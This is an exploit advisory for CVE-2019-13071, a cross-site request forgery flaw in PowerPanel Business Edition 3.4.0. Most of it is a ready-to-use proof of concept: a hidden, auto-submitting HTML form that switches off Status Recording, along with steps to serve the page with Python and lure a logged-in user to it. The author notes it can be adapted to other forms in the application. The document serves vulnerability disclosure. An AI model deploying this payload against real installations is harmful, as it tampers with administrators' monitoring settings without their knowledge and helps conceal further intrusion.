Forgery
# Exploit Author: Joey Lane
# Vendor Homepage: https://www.cyberpowersystems.com
# Version: 3.4.0
# Tested on: Ubuntu 16.04
# CVE : CVE-2019-13071
# Reported to vendor on 5/25/2019, no acknowledgement.

The Agent/Center component of PowerPanel Business Edition is vulnerable to
cross site request forgery. This can be exploited by tricking an
authenticated user into visiting a web page controlled by a malicious
person.

The following example uses CSRF to disable Status Recording under the Logs
/ Settings page.  Create a file named &#039;csrf.html&#039; on a local workstation
with the following contents:

<iframe style="display:none" name="csrf-frame"></iframe>
<div style="display: none;">
<form method=&#039;POST&#039; action=&#039;http://(A VALID HOST
NAME):3052/agent/log_options&#039; target="csrf-frame" id="csrf-form">
  <input type=&#039;hidden&#039; name=&#039;value(recordingEnable)&#039; value=&#039;no&#039;>
  <input type=&#039;hidden&#039; name=&#039;value(recordingInterval)&#039; value=&#039;10&#039;>
  <input type=&#039;hidden&#039; name=&#039;value(periodToRemoveRecord)&#039; value=&#039;2&#039;>
  <input type=&#039;hidden&#039; name=&#039;value(clearAllStatusLogs)&#039; value=&#039;no&#039;>
  <input type=&#039;hidden&#039; name=&#039;value(type)&#039; value=&#039;records&#039;>
  <input type=&#039;hidden&#039; name=&#039;value(action)&#039; value=&#039;Apply&#039;>
  <input type=&#039;hidden&#039; name=&#039;value(button)&#039; value=&#039;Apply&#039;>
  <input type=&#039;submit&#039; value=&#039;submit&#039;>
</form>
</div>
<script>document.getElementById("csrf-form").submit()</script>

Serve the file using python or any other web server:

python -m SimpleHTTPServer 8000

Visit the local page in a browser while logged into PowerPanel Business
Edition:

http://localhost:8000/csrf.html

The hidden form is submitted in the background, and will disable Status
Recording.  This could be adapted to exploit other forms in the web
application as well.

